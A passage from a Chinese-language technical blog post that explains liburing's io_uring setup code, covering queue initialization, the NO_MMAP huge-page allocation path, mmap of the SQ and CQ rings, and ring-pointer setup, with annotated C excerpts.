<li>rings:     <code>io_uring</code> 结构体,  liburing提供给用户态的管理结构</li>
<li>flags:     传递给 <code>io_uring_setup</code> 的 <code>params</code>  中的 flag, 用来控制创建的io_uring的特性, 详情可以看  <a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/io_uring_setup.2.html">io_uring_set_up</a><br>
返回值:</li>
<li>fd:           用来mmap的fd</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__cold <span class="type">int</span> <span class="title function_">io_uring_queue_init</span><span class="params">(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring *ring,</span></span><br><span class="line"><span class="params">			       <span class="type">unsigned</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(&amp;p, <span class="number">0</span>, <span class="keyword">sizeof</span>(p));</span><br><span class="line">	p.flags = flags;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> io_uring_queue_init_params(entries, ring, &amp;p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来是一系列调用链:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--&gt;io_uring_queue_init</span><br><span class="line">	--&gt;io_uring_queue_init_params</span><br><span class="line">		--&gt;io_uring_queue_init_try_nosqarr</span><br><span class="line">			--&gt;__io_uring_queue_init_params</span><br></pre></td></tr></table></figure>
<p>最后到 <code>__io_uring_queue_init_params</code></p>
<p>其中 p 是要传递给 <code>io_uring_setup</code> 的params,  buf 的使用将在后面分析.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __io_uring_queue_init_params(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring *ring,</span><br><span class="line">				 <span class="keyword">struct</span> io_uring_params *p, <span class="type">void</span> *buf,</span><br><span class="line">				 <span class="type">size_t</span> buf_size)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> fd, ret = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> *sq_array;</span><br><span class="line">	<span class="type">unsigned</span> sq_entries, index;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(ring, <span class="number">0</span>, <span class="keyword">sizeof</span>(*ring));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The kernel does this check already, but checking it here allows us</span></span><br><span class="line"><span class="comment">	 * to avoid handling it below.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY</span><br><span class="line">	    &amp;&amp; !(p-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="comment">// 如果设置了REGISTERED_FD_ONLY 就必须要设置 NO_MMAP</span></span><br></pre></td></tr></table></figure>
<p>对于设置了NO_MMAP的请求，通过 <code>io_uring_alloc_huge</code> 进行了预处理，这个函数我们将在之后[[#io_uring_alloc_huge]]进行分析</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_NO_MMAP) &#123;</span><br><span class="line">	ret = io_uring_alloc_huge(entries, p, &amp;ring-&gt;sq, &amp;ring-&gt;cq,</span><br><span class="line">					buf, buf_size);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	<span class="keyword">if</span> (buf)</span><br><span class="line">		ring-&gt;int_flags |= INT_FLAG_APP_MEM;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果设置了NO_MMAP，就要预先分配大内存</span></span><br></pre></td></tr></table></figure>
<p>接下来就是调用<code>io_uring_setup</code>  完成真正的初始化操作了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fd = __sys_io_uring_setup(entries, p);</span><br><span class="line"><span class="comment">// syscall(__NR_io_uring_setup, entries, p)</span></span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> ((p-&gt;flags &amp; IORING_SETUP_NO_MMAP) &amp;&amp;</span><br><span class="line">	    !(ring-&gt;int_flags &amp; INT_FLAG_APP_MEM)) &#123;</span><br><span class="line">		__sys_munmap(ring-&gt;sq.sqes, <span class="number">1</span>);</span><br><span class="line">		io_uring_unmap_rings(&amp;ring-&gt;sq, &amp;ring-&gt;cq);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 错误处理</span></span><br></pre></td></tr></table></figure>
<p>对于没有设置 NO_MMAP 的情形，需要在此时mmap为sq和cq在用户态映射内存[[#io_uring_queue_mmap]]，反之，直接设置ring相关指针[[#io_uring_setup_ring_pointers]]</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_NO_MMAP)) &#123;</span><br><span class="line">	ret = io_uring_queue_mmap(fd, p, ring);</span><br><span class="line">	<span class="keyword">if</span> (ret) &#123;</span><br><span class="line">		__sys_close(fd);</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	io_uring_setup_ring_pointers(p, &amp;ring-&gt;sq, &amp;ring-&gt;cq);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之后，是将<code>io_uring_setup</code> 设置在 params 中的各种变量复制到用户态管理结构体ring中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">	sq_entries = ring-&gt;sq.ring_entries;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_NO_SQARRAY)) &#123;</span><br><span class="line">		sq_array = ring-&gt;sq.<span class="built_in">array</span>;</span><br><span class="line">		<span class="keyword">for</span> (index = <span class="number">0</span>; index &lt; sq_entries; index++)</span><br><span class="line">			sq_array[index] = index;</span><br><span class="line">	&#125;</span><br><span class="line">	ring-&gt;features = p-&gt;features;</span><br><span class="line">	<span class="comment">// io_uring 的 特性</span></span><br><span class="line">	ring-&gt;flags = p-&gt;flags;</span><br><span class="line">	<span class="comment">// io_uring 设置的标志</span></span><br><span class="line">	ring-&gt;enter_ring_fd = fd;</span><br><span class="line">	<span class="comment">// 返回的fd</span></span><br><span class="line">	<span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY) &#123;</span><br><span class="line">		ring-&gt;ring_fd = <span class="number">-1</span>;</span><br><span class="line">		ring-&gt;int_flags |= INT_FLAG_REG_RING | INT_FLAG_REG_REG_RING;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		ring-&gt;ring_fd = fd;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="io-uring-alloc-huge"><code>io_uring_alloc_huge</code></h4>
<p><code>io_uring_alloc_huge</code> 是对于设置了NO_MMAP的程序，预先在用户态设置好SQ和CQ的内存的函数</p>
<p>首先是会用到的各种参数和变量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_uring_alloc_huge</span><span class="params">(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params">			       <span class="keyword">struct</span> io_uring_sq *sq, <span class="keyword">struct</span> io_uring_cq *cq,</span></span><br><span class="line"><span class="params">			       <span class="type">void</span> *buf, <span class="type">size_t</span> buf_size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> page_size = get_page_size();</span><br><span class="line">	<span class="type">unsigned</span> sq_entries, cq_entries;</span><br><span class="line">	<span class="type">size_t</span> ring_mem, sqes_mem;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> mem_used = <span class="number">0</span>;</span><br><span class="line">	<span class="type">void</span> *ptr;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>接下来是首先确定了sq和eq entrie的数量。这里具体的算法就不在这里分析了，主要包括合法性检查和幂2向上取整的运算等。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ret = get_sq_cq_entries(entries, p, &amp;sq_entries, &amp;cq_entries);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br></pre></td></tr></table></figure>
<p>接下来就是计算sq和cq需要的内存大小了，计算过程非常直观，笔者就不赘述了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqes_mem = sq_entries * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_sqe);</span><br><span class="line">sqes_mem = (sqes_mem + page_size - <span class="number">1</span>) &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">ring_mem = cq_entries * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_cqe);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_CQE32)</span><br><span class="line">	ring_mem *= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">	ring_mem += sq_entries * <span class="keyword">sizeof</span>(<span class="type">unsigned</span>);</span><br><span class="line">mem_used = sqes_mem + ring_mem;</span><br><span class="line">mem_used = (mem_used + page_size - <span class="number">1</span>) &amp; ~(page_size - <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>接下来，就是真正决定sq和cq的用户态地址了。</p>
<p>首先，如果用户传入了buf，并且buf_size足够大， 那么就设置为用户buf</p>
<p>否则，就mmap出一片内存来使用（根据size计算的不同可能是4K也可能是4M，分别是一页和一个大页(二级页表对应的大小)）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!buf &amp;&amp; (sqes_mem &gt; huge_page_size || ring_mem &gt; huge_page_size))</span><br><span class="line">	<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (buf) &#123;</span><br><span class="line">	<span class="keyword">if</span> (mem_used &gt; buf_size)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	ptr = buf;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="type">int</span> map_hugetlb = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (sqes_mem &lt;= page_size)</span><br><span class="line">		buf_size = page_size;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		buf_size = huge_page_size;</span><br><span class="line">		map_hugetlb = MAP_HUGETLB;</span><br><span class="line">	&#125;</span><br><span class="line">	ptr = __sys_mmap(<span class="literal">NULL</span>, buf_size, PROT_READ|PROT_WRITE,</span><br><span class="line">				MAP_SHARED|MAP_ANONYMOUS|map_hugetlb,</span><br><span class="line">				<span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(ptr))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(ptr);</span><br><span class="line">&#125;</span><br><span class="line">sq-&gt;sqes = ptr;</span><br></pre></td></tr></table></figure>
<p>并以类似的方式设置了<code>sq-&gt;ring_ptr</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mem_used &lt;= buf_size)</span><br><span class="line">&#123;</span><br><span class="line">	sq-&gt;ring_ptr = (<span class="type">void</span> *)sq-&gt;sqes + sqes_mem;</span><br><span class="line">	<span class="comment">/* clear ring sizes, we have just one mmap() to undo */</span></span><br><span class="line">	cq-&gt;ring_sz = <span class="number">0</span>;</span><br><span class="line">	sq-&gt;ring_sz = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> map_hugetlb = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (ring_mem &lt;= page_size)</span><br><span class="line">		buf_size = page_size;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		buf_size = huge_page_size;</span><br><span class="line">		map_hugetlb = MAP_HUGETLB;</span><br><span class="line">	&#125;</span><br><span class="line">	ptr = __sys_mmap(<span class="literal">NULL</span>, buf_size, PROT_READ | PROT_WRITE,</span><br><span class="line">					 MAP_SHARED | MAP_ANONYMOUS | map_hugetlb,</span><br><span class="line">					 <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(ptr))</span><br><span class="line">	&#123;</span><br><span class="line">		__sys_munmap(sq-&gt;sqes, <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(ptr);</span><br><span class="line">	&#125;</span><br><span class="line">	sq-&gt;ring_ptr = ptr;</span><br><span class="line">	sq-&gt;ring_sz = buf_size;</span><br><span class="line">	cq-&gt;ring_sz = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不过下面一部分就是真正重要的了：</p>
<p>p正是传入 <code>io_uring_setup</code> 的结构体，所以对p的赋值才是至关重要的，这里的sq和cq不过是 <code>liburing</code>  暴露给用户的管理结构 <code>io_uring</code> 中的一个成员</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cq-&gt;ring_ptr = (<span class="type">void</span> *)sq-&gt;ring_ptr;</span><br><span class="line">p-&gt;sq_off.user_addr = (<span class="type">unsigned</span> <span class="type">long</span>)sq-&gt;sqes;</span><br><span class="line">p-&gt;cq_off.user_addr = (<span class="type">unsigned</span> <span class="type">long</span>)sq-&gt;ring_ptr;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">int</span>)mem_used;</span><br></pre></td></tr></table></figure>
<p>所以规根结底就是写入了 p的 sq_off 和 cq_off</p>
<h4 id="io-uring-queue-mmap"><code>io_uring_queue_mmap</code></h4>
<p>这是对于没有设置NO_MMAP的情形下，完成了 syscall <code>io_uring_setup</code> 处理后，mmap的流程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__cold <span class="type">int</span> <span class="title function_">io_uring_queue_mmap</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params">							   <span class="keyword">struct</span> io_uring *ring)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">memset</span>(ring, <span class="number">0</span>, <span class="keyword">sizeof</span>(*ring));</span><br><span class="line">	<span class="keyword">return</span> io_uring_mmap(fd, p, &amp;ring-&gt;sq, &amp;ring-&gt;cq);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先是计算了sq和cq的ring的size</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_uring_mmap</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params">						 <span class="keyword">struct</span> io_uring_sq *sq, <span class="keyword">struct</span> io_uring_cq *cq)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">size_t</span> size;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_cqe);</span><br><span class="line">	<span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_CQE32)</span><br><span class="line">		size += <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_cqe);</span><br><span class="line"></span><br><span class="line">	sq-&gt;ring_sz = p-&gt;sq_off.<span class="built_in">array</span> + p-&gt;sq_entries * <span class="keyword">sizeof</span>(<span class="type">unsigned</span>);</span><br><span class="line">	cq-&gt;ring_sz = p-&gt;cq_off.cqes + p-&gt;cq_entries * size;</span><br></pre></td></tr></table></figure>
<p>然后开始mmap sq 和 cq ring的指针：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (p-&gt;features &amp; IORING_FEAT_SINGLE_MMAP)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (cq-&gt;ring_sz &gt; sq-&gt;ring_sz)</span><br><span class="line">		sq-&gt;ring_sz = cq-&gt;ring_sz;</span><br><span class="line">	cq-&gt;ring_sz = sq-&gt;ring_sz;</span><br><span class="line">&#125;</span><br><span class="line">sq-&gt;ring_ptr = __sys_mmap(<span class="number">0</span>, sq-&gt;ring_sz, PROT_READ | PROT_WRITE,</span><br><span class="line">						  MAP_SHARED | MAP_POPULATE, fd,</span><br><span class="line">						  IORING_OFF_SQ_RING);<span class="comment">// offset = 0</span></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(sq-&gt;ring_ptr))</span><br><span class="line">	<span class="keyword">return</span> PTR_ERR(sq-&gt;ring_ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p-&gt;features &amp; IORING_FEAT_SINGLE_MMAP)</span><br><span class="line">&#123;</span><br><span class="line">	cq-&gt;ring_ptr = sq-&gt;ring_ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	cq-&gt;ring_ptr = __sys_mmap(<span class="number">0</span>, cq-&gt;ring_sz, PROT_READ | PROT_WRITE,</span><br><span class="line">							  MAP_SHARED | MAP_POPULATE, fd,</span><br><span class="line">							  IORING_OFF_CQ_RING);</span><br><span class="line">							  <span class="comment">// offset = 8000000 </span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(cq-&gt;ring_ptr))</span><br><span class="line">	&#123;</span><br><span class="line">		ret = PTR_ERR(cq-&gt;ring_ptr);</span><br><span class="line">		cq-&gt;ring_ptr = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">goto</span> err;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果设置了 <code>IORING_FEAT_SINGLE_MMAP</code> ，就可以将sq 和 cq的ring一起mmap，否则，就分别单独mmap</p>
<p>最后再mmap sq的sqes</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_sqe);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_SQE128)</span><br><span class="line">	size += <span class="number">64</span>;</span><br><span class="line">sq-&gt;sqes = __sys_mmap(<span class="number">0</span>, size * p-&gt;sq_entries, PROT_READ | PROT_WRITE,</span><br><span class="line">					  MAP_SHARED | MAP_POPULATE, fd, IORING_OFF_SQES);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(sq-&gt;sqes))</span><br><span class="line">&#123;</span><br><span class="line">	ret = PTR_ERR(sq-&gt;sqes);</span><br><span class="line">err:</span><br><span class="line">	io_uring_unmap_rings(sq, cq);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后的最后，设置相关指针 [[#io_uring_setup_ring_pointers]]</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io_uring_setup_ring_pointers(p, sq, cq);</span><br></pre></td></tr></table></figure>
<h4 id="io-uring-setup-ring-pointers">io_uring_setup_ring_pointers</h4>
<p>此函数用来设置 <code>struct io_uring ring</code>  也就是liburing的核心管理结构体.</p>
<p>我们知道 <code>sq-&gt;ring_ptr</code> 在 kernel被映射到一个内核结构体, 其中结构体各个成员的偏移通过 <code>io_uring_params</code>  的两个 <code>offset</code> 成员结构体返回, 这里通过此拿到结构体对应成员的指针, 并赋值给 <code>sq</code> 和 <code>cq</code> 的各个成员, 这里的 <code>sq</code> 和 <code>cq</code> 又是 管理结构体 <code>ring</code> 的成员</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">io_uring_setup_ring_pointers</span><span class="params">(<span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params">										 <span class="keyword">struct</span> io_uring_sq *sq,</span></span><br><span class="line"><span class="params">										 <span class="keyword">struct</span> io_uring_cq *cq)</span></span><br><span class="line">&#123;</span><br><span class="line">	sq-&gt;khead = sq-&gt;ring_ptr + p-&gt;sq_off.head;</span><br><span class="line">	<span class="comment">// 设置sq head的指针</span></span><br><span class="line">	sq-&gt;ktail = sq-&gt;ring_ptr + p-&gt;sq_off.tail;</span><br><span class="line">	<span class="comment">// 设置sq tail指针</span></span><br><span class="line">	sq-&gt;kring_mask = sq-&gt;ring_ptr + p-&gt;sq_off.ring_mask;</span><br><span class="line">	sq-&gt;kring_entries = sq-&gt;ring_ptr + p-&gt;sq_off.ring_entries;</span><br><span class="line">	<span class="comment">// 设置sq entries个数</span></span><br><span class="line">	sq-&gt;kflags = sq-&gt;ring_ptr + p-&gt;sq_off.flags;</span><br><span class="line">	<span class="comment">// 设置对应标志</span></span><br><span class="line">	sq-&gt;kdropped = sq-&gt;ring_ptr + p-&gt;sq_off.dropped;</span><br><span class="line">	<span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">		sq-&gt;<span class="built_in">array</span> = sq-&gt;ring_ptr + p-&gt;sq_off.<span class="built_in">array</span>;</span><br><span class="line">	<span class="comment">// 如果存在sqarray</span></span><br><span class="line">	cq-&gt;khead = cq-&gt;ring_ptr + p-&gt;cq_off.head;</span><br><span class="line">	<span class="comment">// 设置cq head指针</span></span><br><span class="line">	cq-&gt;ktail = cq-&gt;ring_ptr + p-&gt;cq_off.tail;</span><br><span class="line">	<span class="comment">// 设置cq tail指针</span></span><br><span class="line">	cq-&gt;kring_mask = cq-&gt;ring_ptr + p-&gt;cq_off.ring_mask;</span><br><span class="line">	cq-&gt;kring_entries = cq-&gt;ring_ptr + p-&gt;cq_off.ring_entries;</span><br><span class="line">	cq-&gt;koverflow = cq-&gt;ring_ptr + p-&gt;cq_off.overflow;</span><br><span class="line">	cq-&gt;cqes = cq-&gt;ring_ptr + p-&gt;cq_off.cqes;</span><br><span class="line">	<span class="keyword">if</span> (p-&gt;cq_off.flags)</span><br><span class="line">		cq-&gt;kflags = cq-&gt;ring_ptr + p-&gt;cq_off.flags;</span><br><span class="line"></span><br><span class="line">	sq-&gt;ring_mask = *sq-&gt;kring_mask;</span><br><span class="line">	sq-&gt;ring_entries = *sq-&gt;kring_entries;</span><br><span class="line">	cq-&gt;ring_mask = *cq-&gt;kring_mask;</span><br><span class="line">	cq-&gt;ring_entries = *cq-&gt;kring_entries;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="io-uring-get-sqe"><code>io_uring_get_sqe</code></h3>
<p>此函数用来获取一个可用 <code>sqe</code> 用来提交任务，最终是调用了  <code>_io_uring_get_sqe</code>， 整个函数用非常优雅的方式实现了循环队列// #Elegant</p>
